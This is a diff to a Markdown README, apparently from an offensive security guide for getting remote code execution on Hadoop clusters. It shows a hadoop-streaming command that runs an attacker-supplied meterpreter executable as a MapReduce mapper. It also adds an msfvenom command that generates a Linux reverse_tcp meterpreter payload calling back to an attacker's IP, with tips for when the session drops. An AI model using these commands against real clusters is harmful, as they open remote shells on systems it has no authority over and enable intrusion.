@@ -53,9 +53,9 @@ Then when the job has terminated its execution:
   ```
   
   
-Executing a meterpreter
------------------------
-Due to the [limitations](#limitations) inherent to Hadoop, it is recommended to **use a `reverse shell` payload.**
+Executing a meterpreter/reverse shell
+-------------------------------------
+Due to the [limitations](#limitations) inherent to Hadoop, it is recommended to **use a `reverse shell` payload** (meterpreter or plain reverse_shell)
 ```
 $ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your executable meterpreter path on HDFS> -reducer NONE -file <your executable meterpreter path on your local attacking environment> -background
 ```
@@ -71,6 +71,12 @@ Limitations
 -----------
 Due to the **distributed nature of a MapReduce job**, it is not possible to specify on which node you want to execute your payload. There is **no mechanism** ensuring that the payload you will launch on **two successive jobs** will execute on the **same cluster member**.  
 As a consequence **you can't know beforehand the server IP where your payload will be executed**: so just use a `reverse shell` payload and **gently wait for your shell to arrive**.
+
+It is possible to use a meterpreter, for instance generated as following:
+```
+$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP address> -f elf -o msf.payload
+```
+Note that on certain Hadoop clusters the meterpreter does work, the session is created, but calling the `shell` command leads to session termination for unknown reasons. In that case use a plain metasploit `reverse_shell` payload.
   
   
 References
